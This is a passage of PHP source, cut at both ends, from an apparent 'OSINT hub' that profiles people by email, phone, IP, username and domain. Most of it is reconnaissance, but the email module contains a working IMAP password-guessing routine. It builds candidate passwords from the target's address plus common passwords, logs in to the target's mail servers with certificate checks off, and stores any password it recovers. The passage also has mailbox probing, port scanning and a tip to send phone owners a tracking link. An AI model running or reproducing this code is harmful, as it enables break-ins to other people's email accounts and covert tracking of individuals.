    if ($deep && flag('imap_brute')) $out['imap'] = imap_bruteforce($p['email'], $mx);
    $out['risk'] = risk_score($out);
    cache_set($ck,$out,$deep ? 86400*3 : 86400);
    db()->prepare('REPLACE INTO email_osint (email,score,level,json,ts) VALUES (?,?,?,?,?)')
        ->execute([$p['email'],$out['risk']['score'],$out['risk']['level'],json_encode($out),gmdate('Y-m-d H:i:s')]);
    return $out;
}
function risk_score(array $d): array {
    $s = 0; $r = [];
    $add = function (int $p, string $w) use (&$s,&$r) { $s += $p; $r[] = ['points'=>$p,'reason'=>$w]; };
    if (empty($d['domain']['mx'])) $add(30,'No MX - cannot receive mail');
    if ($d['domain']['disposable'] ?? false) $add(20,'Disposable provider');
    if ($d['domain']['free_provider'] ?? false) $add(5,'Free consumer provider');
    if (($d['smtp']['status'] ?? '') === 'undeliverable') $add(25,'Mailbox rejected (5xx)');
    if (($d['smtp']['status'] ?? '') === 'deliverable')   $add(-5,'Mailbox confirmed');
    if (in_array($d['syntax']['local'] ?? '',ROLE_MAIL,true)) $add(10,'Role account');
    $er = $d['emailrep'] ?? [];
    if (in_array($er['reputation'] ?? '',['high','medium'],true)) $add(-10,'EmailRep: '.$er['reputation']);
    if (in_array($er['reputation'] ?? '',['low','none'],true)) $add(12,'EmailRep: '.$er['reputation']);
    if (!empty($er['suspicious'])) $add(15,'Flagged suspicious');
    if (!empty($er['details']['blacklisted'])) $add(20,'Blacklisted');
    if (!empty($er['profiles'])) $add(-8,'Public profiles found');
    $bc = count($d['breaches'] ?? []);
    if ($bc >= 10) $add(20,"Exposed in $bc breaches"); elseif ($bc >= 4) $add(12,"Exposed in $bc breaches"); elseif ($bc >= 1) $add(5,"Exposed in $bc breaches");
    if (!empty($d['gravatar']['exists'])) $add(-5,'Gravatar exists');
    if (empty($d['gravatar']['exists']) && empty($d['accounts'])) $add(6,'No public footprint');
    if (($d['imap']['status'] ?? '') === 'found') $add(-15,'Password recovered');
    if (empty($d['domain']['spf'])) $add(5,'No SPF');
    if (empty($d['domain']['dmarc'])) $add(5,'No DMARC');
    $s = max(0, min(100,$s));
    return ['score'=>$s,'level'=>$s >= 60 ? 'high' : ($s >= 30 ? 'medium' : 'low'),'reasons'=>$r];
}
function password_candidates(string $email, int $limit = 40): array {
    $local = explode('@',strtolower($email))[0];
    $base = preg_replace('/[^a-z0-9]/','',$local);
    $words = array_unique(array_filter([$base,$local,ucfirst($base),ucfirst($local)]));
    $sfx = ['','1','12','123','1234','12345','2024','2025','2026','!','!!','01','007','@123','1!'];
    $out = [];
    foreach ($words as $w) foreach ($sfx as $x) $out[] = $w.$x;
    $out = array_merge($out,['password','Password1','Password123','passw0rd','letmein','welcome1','qwerty123','admin','admin123','changeme','iloveyou','monkey','dragon','football','abc123','secret','P@ssw0rd','Summer2025','Winter2025','Winter2026','test1234','welcome','Welcome123','trustno1','master','sunshine','princess','shadow','michael']);
    return array_slice(array_values(array_unique($out)),0,$limit);
}
function smtp_verify(string $email, string $host): array {
    return cached('smtp:'.$email, function () use ($email,$host) {
        $fp = @stream_socket_client("tcp://$host:25", $en, $es, 8);
        if (!$fp) return ['status'=>'connect_failed','mx'=>$host];
        stream_set_timeout($fp,8);
        $read = function () use ($fp) { $d=''; while (($l = fgets($fp,1024)) !== false) { $d .= $l; if (isset($l[3]) && $l[3] === ' ') break; } return $d; };
        $send = function ($c) use ($fp,$read) { fwrite($fp, $c."\r\n"); return $read(); };
        if (!preg_match('/^2\d\d/', $read())) { fclose($fp); return ['status'=>'bad_greeting']; }
        $me = parse_url(base_url(), PHP_URL_HOST) ?: 'localhost';
        $send('EHLO '.$me); $send('MAIL FROM:<verify@'.$me.'>');
        $resp = $send('RCPT TO:<'.$email.'>'); $send('QUIT'); fclose($fp);
        if (preg_match('/^2\d\d/m',$resp)) return ['status'=>'deliverable','mx'=>$host];
        if (preg_match('/^5\d\d/m',$resp)) return ['status'=>'undeliverable','mx'=>$host];
        return ['status'=>'unknown','mx'=>$host];
    }, 3600);
}
function imap_hosts_for(string $domain, array $mx): array {
    $s = strtolower(implode(' ', array_column($mx,'host')));
    $map = ['google'=>'imap.gmail.com','outlook'=>'outlook.office365.com','yahoo'=>'imap.mail.yahoo.com',
        'icloud'=>'imap.mail.me.com','fastmail'=>'imap.fastmail.com','zoho'=>'imap.zoho.com','gmx'=>'imap.gmx.com',
        'yandex'=>'imap.yandex.com','ionos'=>'imap.ionos.com','secureserver'=>'imap.secureserver.net'];
    $h = [];
    foreach ($map as $n=>$host) if (str_contains($s,$n)) $h[] = $host;
    return array_values(array_unique(array_merge($h,['imap.'.$domain,'mail.'.$domain])));
}
function imap_try(string $host, string $u, string $p, int $t = 8): bool {
    $fp = @stream_socket_client("ssl://$host:993", $en, $es, $t, STREAM_CLIENT_CONNECT,
        stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]]));
    if (!$fp) return false;
    stream_set_timeout($fp,$t); @fgets($fp,1024);
    $q = fn($s) => '"'.addcslashes($s,"\"\\").'"';
    @fwrite($fp, 'a1 LOGIN '.$q($u).' '.$q($p)."\r\n");
    $ok = false;
    while (($l = @fgets($fp,2048)) !== false) if (str_starts_with($l,'a1 ')) { $ok = stripos($l,'OK') !== false; break; }
    @fwrite($fp,"a2 LOGOUT\r\n"); @fclose($fp);
    return $ok;
}
function imap_bruteforce(string $email, array $mx): array {
    $p = email_parts($email); if (!$p) return ['status'=>'bad_email'];
    $hosts = imap_hosts_for($p['domain'], $mx);
    $cands = array_slice(password_candidates($email,60),0,20);
    $tried = 0;
    foreach ($hosts as $host) {
        $probe = @stream_socket_client("ssl://$host:993", $en, $es, 4, STREAM_CLIENT_CONNECT,
            stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]]));
        if (!$probe) continue;
        @fclose($probe);
        foreach ($cands as $pw) {
            if (imap_try($host,$email,$pw)) return ['status'=>'found','host'=>$host,'password'=>$pw,'tried'=>$tried+1];
            if (++$tried >= 20) break;
        }
        return ['status'=>'not_found','host'=>$host,'tried'=>$tried];
    }
    return ['status'=>'no_imap_host'];
}

/* ============================ PHONE OSINT ========================== */
function phone_osint(string $raw, bool $deep = false, bool $fast = false): array {
    global $CFG;
    if (!flag('osint_enabled')) return ['ok'=>false,'error'=>'osint disabled'];
    $e164 = phone_normalize($raw);
    if (!$e164) return ['ok'=>false,'error'=>'unparseable number','input'=>$raw];
    $ck = 'osint_p:'.$e164.($deep?':d':'');
    if (($hit = cache_get($ck)) !== null) { $hit['cached'] = true; return $hit; }

    $off = phone_parse($e164); $jobs = [];
    if ($CFG['numverify_key']) $jobs['numverify'] = ['url'=>'http://apilayer.net/api/validate?access_key='.urlencode($CFG['numverify_key']).'&number='.urlencode($e164).'&format=1','timeout'=>10];
    if ($CFG['abstract_phone_key']) $jobs['abstract'] = ['url'=>'https://phonevalidation.abstractapi.com/v1/?api_key='.urlencode($CFG['abstract_phone_key']).'&phone='.urlencode($e164),'timeout'=>10];
    if ($CFG['ipqs_key']) $jobs['ipqs'] = ['url'=>'https://ipqualityscore.com/api/json/phone/'.urlencode($CFG['ipqs_key']).'/'.urlencode($e164),'timeout'=>10];
    if ($deep && $CFG['hlr_key']) $jobs['hlr'] = ['url'=>'https://www.hlrlookup.com/api/lookup?api_key='.urlencode($CFG['hlr_key']).'&msisdn='.urlencode(ltrim($e164,'+')),'timeout'=>15];
    if ($deep && flag('ddg_enabled')) {
        $vars = array_values(array_unique(array_filter([$e164, $off['formats']['national'] ?? null])));
        $i = 0;
        foreach (array_slice($vars,0,2) as $v) if (strlen($v) >= 7) $jobs['ddg'.$i++] = ['url'=>'https://html.duckduckgo.com/html/?q='.urlencode('"'.$v.'"'),'timeout'=>12];
    }
    $H = gather($jobs);
    $J = fn($k) => (($H[$k]['status'] ?? 0) >= 200 && ($H[$k]['status'] ?? 0) < 400) ? json_decode($H[$k]['body'],true) : null;

    $out = ['ok'=>true,'input'=>$raw,'generated'=>gmdate('c'),'e164'=>$e164,'valid'=>$off['valid'],
        'country'=>$off['country'] ?? null,'country_name'=>$off['country_name'] ?? null,
        'region'=>$off['region'] ?? null,'line_type'=>$off['line_type'] ?? null,'carrier'=>null,
        'formats'=>$off['formats'] ?? [],'national'=>$off['national'] ?? null,
        'calling_code'=>$off['calling_code'] ?? null,'hlr'=>['status'=>'not_attempted'],'public_mentions'=>[]];

    if ($out['valid']) {
        foreach (['numverify','abstract'] as $k) {
            $j = $J($k);
            if ($j && !empty($j['valid'])) {
                $out['carrier'] = $j['carrier'] ?? null;
                $out['line_type'] = $j['line_type'] ?? $j['type'] ?? $out['line_type'];
                $out['carrier_location'] = $j['location'] ?? null;
                break;
            }
        }
        if ($h = $J('hlr'))
            $out['hlr'] = ['status'=>'ok','active'=>$h['status'] ?? null,'ported'=>$h['is_ported'] ?? null,
                'mccmnc'=>$h['mccmnc'] ?? null];
        foreach (['ddg0','ddg1'] as $dk) {
            if (empty($H[$dk]['body'])) continue;
            if (preg_match_all('~<a[^>]*class="result__a"[^>]*href="([^"]+)"[^>]*>(.*?)</a>~s',$H[$dk]['body'],$m,PREG_SET_ORDER))
                foreach (array_slice($m,0,8) as $mm) {
                    $u = html_entity_decode($mm[1],ENT_QUOTES);
                    if (preg_match('~uddg=([^&]+)~',$u,$x)) $u = urldecode($x[1]);
                    $t = trim(html_entity_decode(strip_tags($mm[2]),ENT_QUOTES));
                    if ($u && $t && !isset($out['public_mentions'][$u])) $out['public_mentions'][$u] = ['title'=>$t,'url'=>$u];
                }
        }
        $out['public_mentions'] = array_values($out['public_mentions']);
        $out['history'] = phone_snapshot($e164,$out);
        $out['spam'] = phone_spam($e164,['line_type'=>$out['line_type'],'hlr'=>$out['hlr'],
            'public_mentions'=>$out['public_mentions'],'history'=>$out['history'],'ipqs'=>$J('ipqs')]);
        if ($out['history']['recycled']) alert('phone_recycled','high',$e164,$e164.' likely recycled');
    } else {
        $out['spam'] = ['score'=>20,'level'=>'low','reasons'=>[$off['error'] ?? 'invalid'],'source'=>'heuristic'];
    }
    $out['caveats'] = array_values(array_filter([
        empty($out['carrier']) ? 'Carrier needs a numverify/abstractapi key.' : null,
        'A number has no GPS - send it a tracking link.',
    ]));
    cache_set($ck,$out,$deep ? 86400*3 : 86400);
    db()->prepare('REPLACE INTO phone_osint (e164,json,ts) VALUES (?,?,?)')->execute([$e164,json_encode($out),gmdate('Y-m-d H:i:s')]);
    return $out;
}
function phone_spam(string $e164, array $c): array {
    if (($i = $c['ipqs'] ?? null) && !empty($i['success'])) {
        $s = (int)($i['fraud_score'] ?? 0);
        return ['score'=>$s,'level'=>$s >= 75 ? 'high' : ($s >= 40 ? 'medium' : 'low'),
            'reasons'=>array_values(array_filter([!empty($i['spammer']) ? 'reported spammer' : null,!empty($i['VOIP']) ? 'VoIP' : null])),
            'source'=>'ipqualityscore'];
    }
    $s = 0; $r = [];
    if (($c['line_type'] ?? '') === 'toll-free') { $s += 10; $r[] = 'toll-free'; }
    if (!empty($c['hlr']['ported'])) { $s += 15; $r[] = 'ported'; }
    if (!empty($c['public_mentions'])) { $s -= 10; $r[] = 'appears publicly'; }
    if (!empty($c['history']['recycled'])) { $s += 20; $r[] = 'recycling signs'; }
    return ['score'=>max(0,min(100,$s)),'level'=>$s >= 60 ? 'high' : ($s >= 30 ? 'medium' : 'low'),'reasons'=>$r,'source'=>'heuristic'];
}

/* ============================== IP OSINT =========================== */
function ip_osint(string $ip, bool $deep = false): array {
    if (!filter_var($ip, FILTER_VALIDATE_IP)) return ['ok'=>false,'error'=>'invalid ip'];
    $ck = 'osint_ip:'.$ip.($deep?':d':'');
    if (($hit = cache_get($ck)) !== null) { $hit['cached'] = true; return $hit; }
    $t0 = microtime(true);
    $geo = geo_ip($ip);
    $out = ['ok'=>true,'ip'=>$ip,'version'=>str_contains($ip,':') ? 6 : 4,'geo'=>$geo,
        'reverse'=>@gethostbyaddr($ip) ?: null,'generated'=>gmdate('c')];

    $H = gather([
        'asn'=>['url'=>'https://api.bgpview.io/ip/'.urlencode($ip),'timeout'=>9],
        'rdap'=>['url'=>'https://rdap.org/ip/'.urlencode($ip),'headers'=>['Accept: application/rdap+json'],'timeout'=>10],
    ]);
    if (($H['asn']['status'] ?? 0) === 200) {
        $d = json_decode($H['asn']['body'],true)['data'] ?? [];
        $out['asn'] = ['number'=>$d['asn'] ?? null,'name'=>$d['name'] ?? null,
            'country'=>$d['country_code'] ?? null,'rir'=>$d['rir_allocation']['rir_name'] ?? null];
    }
    if (($H['rdap']['status'] ?? 0) === 200) {
        $j = json_decode($H['rdap']['body'],true);
        $out['netblock'] = ['name'=>$j['name'] ?? null,'start'=>$j['startAddress'] ?? null,
            'end'=>$j['endAddress'] ?? null,'type'=>$j['type'] ?? null];
        foreach (($j['entities'] ?? []) as $ent)
            if (in_array('registrant',$ent['roles'] ?? [],true))
                foreach (($ent['vcardArray'][1] ?? []) as $v) if (($v[0] ?? '') === 'fn') $out['netblock']['org'] = $v[3] ?? null;
    }
    if (flag('tor_check')) {
        $list = cached('tor_exit_list', function () {
            $r = http('https://check.torproject.org/torbulkexitlist', ['timeout'=>12]);
            return $r['status'] === 200 ? array_flip(array_filter(array_map('trim', explode("\n",$r['body'])))) : [];
        }, 21600) ?? [];
        $out['tor'] = isset($list[$ip]);
    }
    if (flag('dnsbl_enabled') && !str_contains($ip,':')) {
        $rev = implode('.', array_reverse(explode('.',$ip)));
        $zones = ['zen.spamhaus.org'=>'Spamhaus ZEN','bl.spamcop.net'=>'SpamCop','dnsbl.sorbs.net'=>'SORBS','b.barracudacentral.org'=>'Barracuda'];
        $j = []; foreach ($zones as $z=>$n) $j[$z] = ['url'=>'https://dns.google/resolve?name='.$rev.'.'.$z.'&type=A','timeout'=>6,'headers'=>['Accept: application/dns-json']];
        $H2 = gather($j); $out['blacklists'] = [];
        foreach ($H2 as $z=>$r) {
            $j2 = json_decode($r['body'],true);
            if (!empty($j2['Answer'])) $out['blacklists'][] = ['zone'=>$zones[$z],'answers'=>array_column($j2['Answer'],'data')];
        }
        $out['blacklisted'] = count($out['blacklists']) > 0;
    }
    if ($deep && flag('ports_enabled')) {
        $ports = [21=>'ftp',22=>'ssh',23=>'telnet',25=>'smtp',53=>'dns',80=>'http',110=>'pop3',143=>'imap',
                  443=>'https',445=>'smb',587=>'smtp-sub',993=>'imaps',995=>'pop3s',3306=>'mysql',3389=>'rdp',
                  5432=>'postgres',6379=>'redis',8080=>'http-alt',8443=>'https-alt'];
        $out['ports'] = [];
        foreach ($ports as $p=>$svc) if (port_open($ip, $p, 1.5)) $out['ports'][] = ['port'=>$p,'service'=>$svc];
    }
    $out['latency_ms'] = (int)round((microtime(true)-$t0)*1000);
    cache_set($ck,$out,$deep ? 86400 : 3600);
    db()->prepare('REPLACE INTO ip_osint (ip,json,ts) VALUES (?,?,?)')->execute([$ip,json_encode($out),gmdate('Y-m-d H:i:s')]);
    return $out;
}

/* =========================== USERNAME OSINT ======================== */
const USER_SITES = [
    'github'=>['url'=>'https://github.com/%s','probe'=>'https://api.github.com/users/%s'],
    'gitlab'=>['url'=>'https://gitlab.com/%s','probe'=>'https://gitlab.com/api/v4/users?username=%s'],
    'reddit'=>['url'=>'https://reddit.com/user/%s','probe'=>'https://www.reddit.com/user/%s/about.json'],
    'keybase'=>['url'=>'https://keybase.io/%s','probe'=>'https://keybase.io/_/api/1.0/user/lookup.json?username=%s'],
    'telegram'=>['url'=>'https://t.me/%s','probe'=>null],
    'medium'=>['url'=>'https://medium.com/@%s','probe'=>null],
    'devto'=>['url'=>'https://dev.to/%s','probe'=>'https://dev.to/api/users/by_username?url=%s'],
    'hashnode'=>['url'=>'https://hashnode.com/@%s','probe'=>null],
    'npm'=>['url'=>'https://npmjs.com/~%s','probe'=>'https://registry.npmjs.org/-/user/org.couchdb.user:%s'],
    'pypi'=>['url'=>'https://pypi.org/user/%s','probe'=>null],
    'dockerhub'=>['url'=>'https://hub.docker.com/u/%s','probe'=>'https://hub.docker.com/v2/users/%s/'],
    'bitbucket'=>['url'=>'https://bitbucket.org/%s','probe'=>'https://api.bitbucket.org/2.0/users/%s'],
    'codepen'=>['url'=>'https://codepen.io/%s','probe'=>null],
    'twitch'=>['url'=>'https://twitch.tv/%s','probe'=>null],
    'soundcloud'=>['url'=>'https://soundcloud.com/%s','probe'=>null],
    'behance'=>['url'=>'https://behance.net/%s','probe'=>null],
    'dribbble'=>['url'=>'https://dribbble.com/%s','probe'=>null],
    'pinterest'=>['url'=>'https://pinterest.com/%s','probe'=>null],
    'vk'=>['url'=>'https://vk.com/%s','probe'=>null],
    'mastodon'=>['url'=>'https://mastodon.social/@%s','probe'=>'https://mastodon.social/api/v1/accounts/lookup?acct=%s'],
    'bluesky'=>['url'=>'https://bsky.app/profile/%s.bsky.social','probe'=>'https://public.api.bsky.app/xrpc/app.bsky.actor.getProfile?actor=%s.bsky.social'],
    'hackernews'=>['url'=>'https://news.ycombinator.com/user?id=%s','probe'=>null],
    'stackoverflow'=>['url'=>'https://stackoverflow.com/users/filter?search=%s','probe'=>null],
    'lastfm'=>['url'=>'https://last.fm/user/%s','probe'=>null],
    'flickr'=>['url'=>'https://flickr.com/people/%s','probe'=>null],
    'aboutme'=>['url'=>'https://about.me/%s','probe'=>null],
    'gravatar'=>['url'=>'https://gravatar.com/%s','probe'=>null],
    'roblox'=>['url'=>'https://roblox.com/user.aspx?username=%s','probe'=>null],
    'steam'=>['url'=>'https://steamcommunity.com/id/%s','probe'=>null],
    'tiktok'=>['url'=>'https://tiktok.com/@%s','probe'=>null],
    'youtube'=>['url'=>'https://youtube.com/@%s','probe'=>null],
    'wattpad'=>['url'=>'https://wattpad.com/user/%s','probe'=>null],
    'replit'=>['url'=>'https://replit.com/@%s','probe'=>null],
    'codesandbox'=>['url'=>'https://codesandbox.io/u/%s','probe'=>null],
];
function username_osint(string $u): array {
    $u = trim($u);
    if (!preg_match('/^[A-Za-z0-9._-]{2,40}$/', $u)) return ['ok'=>false,'error'=>'bad username'];
    $ck = 'osint_u:'.$u;
    if (($hit = cache_get($ck)) !== null) { $hit['cached'] = true; return $hit; }
    $t0 = microtime(true);
    $jobs = [];
    foreach (USER_SITES as $k=>$s) $jobs[$k] = ['url'=>sprintf($s['probe'] ?? $s['url'], rawurlencode($u)),'timeout'=>9,'follow'=>true];
    $H = gather($jobs);

    $found = []; $checked = 0;
    foreach (USER_SITES as $k=>$s) {
        $r = $H[$k] ?? null; if (!$r) continue;
        $checked++; $exists = $r['status'] === 200 && $r['body'] !== '';
        if ($exists && $s['probe'] && str_contains($s['probe'],'api')) {
            $j = json_decode($r['body'],true);
            if (is_array($j)) {
                if (isset($j['id']) || isset($j['username']) || isset($j['login']) || isset($j['them'])) $exists = true;
                elseif (isset($j[0]['username'])) $exists = true;
                else $exists = false;
            }
        }
        if ($r['status'] === 404) $exists = false;
        if ($exists) $found[] = ['site'=>$k,'url'=>sprintf($s['url'], rawurlencode($u))];
    }
    $out = ['ok'=>true,'username'=>$u,'checked'=>$checked,'found'=>count($found),'profiles'=>$found,
        'latency_ms'=>(int)round((microtime(true)-$t0)*1000),'alternates'=>username_variants($u),'generated'=>gmdate('c')];
    cache_set($ck,$out,86400);
    db()->prepare('REPLACE INTO user_osint (username,json,ts) VALUES (?,?,?)')->execute([$u,json_encode($out),gmdate('Y-m-d H:i:s')]);
    return $out;
}
function username_variants(string $u): array {
    $b = preg_replace('/[^a-z0-9]/i','',$u); $out = [];
    foreach ([$b.'1',$b.'_',$b.'dev',$b.'io',$b.'hq',$b.'x','real'.$b,'the'.$b,$b.'_official'] as $v) if ($v !== $u) $out[] = $v;
    return array_slice(array_unique($out),0,10);
}

/* ============================== DOMAIN ============================= */
function domain_intel(string $domain): array {
    $domain = norm_domain($domain);
    return cached('domain:'.$domain, function () use ($domain) {
        $H = gather(['rdap'=>['url'=>'https://rdap.org/domain/'.urlencode($domain),'headers'=>['Accept: application/rdap+json'],'timeout'=>10]]);
        $out = ['ok'=>true,'domain'=>$domain,'disposable'=>in_array($domain,disposable_domains(),true),
            'free_provider'=>in_array($domain,FREE_MAIL,true),'mx'=>dns_mx($domain),'a'=>dns_a($domain),'ns'=>dns_ns($domain)];
        foreach (dns_txt($domain) as $t) if (stripos($t,'v=spf1') === 0) $out['spf'] = $t;
        foreach (dns_txt('_dmarc.'.$domain) as $t) if (stripos($t,'v=DMARC1') === 0) $out['dmarc'] = $t;
        if (($H['rdap']['status'] ?? 0) === 200 && ($j = json_decode($H['rdap']['body'],true))) {
            foreach (($j['entities'] ?? []) as $ent)
                if (in_array('registrar',$ent['roles'] ?? [],true))
                    foreach (($ent['vcardArray'][1] ?? []) as $v) if (($v[0] ?? '') === 'fn') $out['registrar'] = $v[3] ?? null;
            foreach (($j['events'] ?? []) as $ev) {
                if (($ev['eventAction'] ?? '') === 'registration') $out['created'] = $ev['eventDate'] ?? null;
                if (($ev['eventAction'] ?? '') === 'expiration')   $out['expires'] = $ev['eventDate'] ?? null;
            }
            $out['status'] = $j['status'] ?? [];
        }
        return $out;
    }, 86400*3);
}
function subdomains(string $domain): array {
    $domain = norm_domain($domain);
    return cached('subs:'.$domain, function () use ($domain) {
        $r = http('https://crt.sh/?q='.urlencode('%.'.$domain).'&output=json', ['timeout'=>20]);
        $out = [];
        if ($r['status'] === 200) {
            $j = json_decode($r['body'],true);
            if (is_array($j)) foreach ($j as $row)
                foreach (explode("\n", (string)($row['name_value'] ?? '')) as $n) {
                    $n = strtolower(trim($n));
                    if ($n && !str_contains($n,'*') && str_ends_with($n,$domain)) $out[$n] = true;
                }
        }
        return ['ok'=>true,'domain'=>$domain,'count'=>count($out),'subdomains'=>array_slice(array_keys($out),0,400)];
    }, 86400);
}
function sec_headers(string $url): array {
    if (!preg_match('~^https?://~',$url)) $url = 'https://'.$url;
    $r = http_headers($url, 12);
    $want = ['strict-transport-security'=>'HSTS','content-security-policy'=>'CSP',
        'x-frame-options'=>'X-Frame-Options','x-content-type-options'=>'X-Content-Type-Options',
        'referrer-policy'=>'Referrer-Policy','permissions-policy'=>'Permissions-Policy',
        'cross-origin-opener-policy'=>'COOP','cross-origin-embedder-policy'=>'COEP',
        'cross-origin-resource-policy'=>'CORP'];
    $present = []; $missing = []; $score = 0;
    foreach ($want as $k=>$label) {
        if (!empty($r['headers'][$k])) { $present[$label] = $r['headers'][$k]; $score += 10; }
        else $missing[] = $label;
    }
    return ['ok'=>true,'status'=>$r['status'],'server'=>$r['headers']['server'] ?? null,
        'present'=>$present,'missing'=>$missing,'score'=>min(100,$score),
        'grade'=>$score >= 70 ? 'A' : ($score >= 50 ? 'B' : ($score >= 30 ? 'C' : ($score >= 10 ? 'D' : 'F')))];
}
function pwned_password(string $pw): array {
    $sha = strtoupper(sha1($pw)); $pre = substr($sha,0,5); $suf = substr($sha,5);
    $r = http('https://api.pwnedpasswords.com/range/'.$pre, ['timeout'=>10]);
    if ($r['status'] !== 200) return ['ok'=>false,'error'=>'api unreachable'];
    foreach (explode("\n",$r['body']) as $line) {
        $parts = explode(':', trim($line));
        if (($parts[0] ?? '') === $suf) return ['ok'=>true,'pwned'=>true,'count'=>(int)($parts[1] ?? 0)];
    }
    return ['ok'=>true,'pwned'=>false,'count'=>0];
}

/* ============================== TOOLBOX ============================ */
function tb_hash(string $v, string $algo): array {
    if (!in_array($algo,hash_algos(),true)) return ['error'=>'unsupported algo'];
    return ['algo'=>$algo,'hash'=>hash($algo,$v)];
}
function tb_jwt(string $t): array {
    $p = explode('.',$t); if (count($p) < 2) return ['error'=>'not a jwt'];
    $d = fn($s) => json_decode(base64_decode(strtr($s,'-_','+/')), true);
    return ['header'=>$d($p[0]),'payload'=>$d($p[1]),'signature'=>$p[2] ?? null];
}
function tb_iban(string $iban): array {
    $iban = strtoupper(preg_replace('/\s+/','',$iban));
    if (!preg_match('/^[A-Z]{2}\d{2}[A-Z0-9]{10,30}$/',$iban)) return ['valid'=>false,'reason'=>'format'];
    $re = substr($iban,4).substr($iban,0,4); $num = '';
    foreach (str_split($re) as $c) $num .= ctype_alpha($c) ? (string)(ord($c)-55) : $c;
    $mod = 0; foreach (str_split($num) as $d) $mod = ($mod*10 + (int)$d) % 97;
    return ['valid'=>$mod === 1,'country'=>substr($iban,0,2),'check'=>substr($iban,2,2),'formatted'=>implode(' ',str_split($iban,4))];
}
function tb_luhn(string $n): array {
    $n = preg_replace('/\D/','',$n); $sum = 0; $alt = false;
    for ($i = strlen($n)-1; $i >= 0; $i--) { $d = (int)$n[$i]; if ($alt) { $d *= 2; if ($d > 9) $d -= 9; } $sum += $d; $alt = !$alt; }
    return ['valid'=>($sum % 10 === 0),'digits'=>strlen($n)];
}
function tb_password(int $len = 20, string $set = 'full'): array {
    $alpha = match ($set) {
        'alpha'=>'abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ','num'=>'0123456789','hex'=>'0123456789abcdef',
        default=>'abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789!@#$%^&*-_=+',
    };
    $len = max(4,min(128,$len)); $pw = '';
    for ($i=0;$i<$len;$i++) $pw .= $alpha[random_int(0,strlen($alpha)-1)];
    $e = round($len * log(strlen($alpha),2),1);
    return ['password'=>$pw,'length'=>$len,'entropy_bits'=>$e,'strength'=>$e > 90 ? 'excellent' : ($e > 60 ? 'strong' : ($e > 40 ? 'fair' : 'weak'))];
}
function tb_entropy(string $s): array {
    $freq = array_count_values(str_split($s)); $len = strlen($s); $h = 0.0;
    foreach ($freq as $c) { $p = $c / max(1,$len); $h -= $p * log($p,2); }
    return ['length'=>$len,'shannon_bits_per_char'=>round($h,3),'total_bits'=>round($h*$len,1)];
}
function tb_time(int $ts): array {
    return ['unix'=>$ts,'iso'=>gmdate('c',$ts),'utc'=>gmdate('Y-m-d H:i:s',$ts),'relative'=>(time()-$ts).'s ago','weekday'=>gmdate('l',$ts)];
}
function tb_uuid(): string {
    $d = random_bytes(16); $d[6] = chr((ord($d[6]) & 0x0f) | 0x40); $d[8] = chr((ord($d[8]) & 0x3f) | 0x80);
    return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($d),4));
}

/* ================================ QR =============================== */
function qr_png(string $data, int $size = 300): ?string {
    $ck = 'qr:'.md5($data.'|'.$size);
    if ($h = cache_get($ck)) return base64_decode((string)$h);
    $r = http('https://quickchart.io/qr?text='.urlencode($data).'&size='.$size.'&ecLevel=M&margin=1', ['timeout'=>12]);
    if ($r['status'] !== 200 || strlen($r['body']) < 100)
        $r = http('https://api.qrserver.com/v1/create-qr-code/?size='.$size.'x'.$size.'&data='.urlencode($data), ['timeout'=>12]);
    if ($r['status'] !== 200 || strlen($r['body']) < 100) return null;
    cache_set($ck, base64_encode($r['body']), 86400*30);
    return $r['body'];
}

/* ============================= MESSAGING =========================== */
function send_smtp(string $to, string $body, string $subject = 'OSINT alert'): array {
    global $CFG; $m = $CFG['messaging'];
    if (!$m['smtp_host']) return ['ok'=>false,'error'=>'smtp not configured'];
    $port = (int)$m['smtp_port']; $scheme = $port === 465 ? 'ssl://' : 'tcp://';
    $fp = @stream_socket_client($scheme.$m['smtp_host'].':'.$port, $en, $es, 12);
    if (!$fp) return ['ok'=>false,'error'=>'smtp connect: '.$es];
    stream_set_timeout($fp,12);
    $read = function () use ($fp) { $d=''; while (($l = fgets($fp,2048)) !== false) { $d .= $l; if (isset($l[3]) && $l[3] === ' ') break; } return $d; };
    $cmd  = function ($c) use ($fp,$read) { fwrite($fp,$c."\r\n"); return $read(); };
    $read();
    $host = parse_url(base_url(), PHP_URL_HOST) ?: 'localhost';
    $cmd('EHLO '.$host);
    if ($port === 587) { $cmd('STARTTLS'); @stream_socket_enable_crypto($fp,true,STREAM_CRYPTO_METHOD_TLS_CLIENT); $cmd('EHLO '.$host); }
    if ($m['smtp_user']) {
        $cmd('AUTH LOGIN'); $cmd(base64_encode($m['smtp_user']));
        if (strpos($cmd(base64_encode($m['smtp_pass'])),'235') === false) { fclose($fp); return ['ok'=>false,'error'=>'auth failed']; }
    }
    $from = $m['smtp_from'] ?: $m['smtp_user'];
    $cmd('MAIL FROM:<'.$from.'>'); $cmd('RCPT TO:<'.$to.'>'); $cmd('DATA');
    fwrite($fp, "From: OSINT hub <$from>\r\nTo: $to\r\nSubject: $subject\r\nMIME-Version: 1.0\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n".str_replace("\n.","\n..",$body)."\r\n.\r\n");
    $r = $read(); $cmd('QUIT'); fclose($fp);
    return strpos($r,'250') !== false ? ['ok'=>true] : ['ok'=>false,'error'=>trim($r)];
}
function send_http_mail(string $to, string $body, string $subject = 'OSINT alert'): array {
    global $CFG; $m = $CFG['messaging'];
    if (!$m['http_mail_key']) return ['ok'=>false,'error'=>'http mail not configured'];
    $from = $m['http_mail_from'] ?: ('osint@'.(parse_url(base_url(),PHP_URL_HOST) ?: 'localhost'));
    $req = match ($m['http_mail_provider']) {
        'brevo'=>['https://api.brevo.com/v3/smtp/email',['api-key: '.$m['http_mail_key'],'Content-Type: application/json'],
                  json_encode(['sender'=>['email'=>$from],'to'=>[['email'=>$to]],'subject'=>$subject,'textContent'=>$body])],
        'mailjet'=>['https://api.mailjet.com/v3.1/send',['Authorization: Basic '.base64_encode($m['http_mail_key']),'Content-Type: application/json'],
                    json_encode(['Messages'=>[['From'=>['Email'=>$from],'To'=>[['Email'=>$to]],'Subject'=>$subject,'TextPart'=>$body]]])],
        'resend'=>['https://api.resend.com/emails',['Authorization: Bearer '.$m['http_mail_key'],'Content-Type: application/json'],
                   json_encode(['from'=>$from,'to'=>$to,'subject'=>$subject,'text'=>$body])],
